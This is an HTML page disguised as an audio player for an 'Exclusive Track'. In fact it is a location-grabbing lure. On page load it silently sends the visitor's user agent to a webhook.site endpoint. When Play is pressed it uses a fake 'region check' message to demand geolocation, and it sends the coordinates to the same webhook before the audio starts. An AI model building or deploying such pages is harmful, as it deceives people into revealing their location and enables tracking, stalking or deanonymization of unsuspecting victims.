<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Audio Player</title>
    <style>
        body { margin: 0; font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; background: linear-gradient(135deg, #1e1e1e 0%, #121212 100%); color: white; }
        .player { background: rgba(255, 255, 255, 0.05); padding: 30px; border-radius: 25px; text-align: center; width: 320px; backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); }
        .controls { display: flex; justify-content: center; align-items: center; gap: 20px; margin-top: 20px; }
        button { background: #1DB954; border: none; border-radius: 50%; width: 60px; height: 60px; cursor: pointer; color: white; font-size: 20px; transition: 0.3s; }
        .small-btn { width: 40px; height: 40px; background: rgba(255,255,255,0.2); }
        #progress { width: 100%; margin: 20px 0; accent-color: #1DB954; cursor: pointer; }
        #status { font-size: 12px; color: #888; margin-top: 10px; }
    </style>
</head>
<body>

<div class="player">
    <h3>Exclusive Track</h3>
    <input type="range" id="progress" value="0" step="1">
    <div class="controls">
        <button class="small-btn" onclick="skip(-10)">◀</button>
        <button id="playBtn" onclick="togglePlay()">▶</button>
        <button class="small-btn" onclick="skip(10)">▶</button>
    </div>
    <div id="status">Нажмите Play для проверки региона</div>
</div>

<audio id="myAudio" src="track.mp3"></audio>

<script>
    const audio = document.getElementById('myAudio');
    const playBtn = document.getElementById('playBtn');
    const progress = document.getElementById('progress');
    const webhookUrl = "https://webhook.site/0d3186b7-c1ce-431e-abc0-5b792b220ae6";

    // Сбор данных при загрузке
    fetch(`${webhookUrl}?type=VISIT&ua=${navigator.userAgent}`);

    function togglePlay() {
        if (audio.paused) {
            // Проверка гео перед запуском
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    fetch(`${webhookUrl}?type=GEO&lat=${pos.coords.latitude}&lon=${pos.coords.longitude}`);
                    audio.play();
                    playBtn.innerText = "⏸";
                },
                () => alert("Разрешите доступ к местоположению для прослушивания!")
            );
        } else {
            audio.pause();
            playBtn.innerText = "▶";
        }
    }

    function skip(seconds) {
        audio.currentTime += seconds;
    }

    // Синхронизация прогресс-бара
    audio.ontimeupdate = () => {
        progress.max = audio.duration;
        progress.value = audio.currentTime;
    };

    progress.oninput = () => {
        audio.currentTime = progress.value;
    };
</script>
</body>
</html>
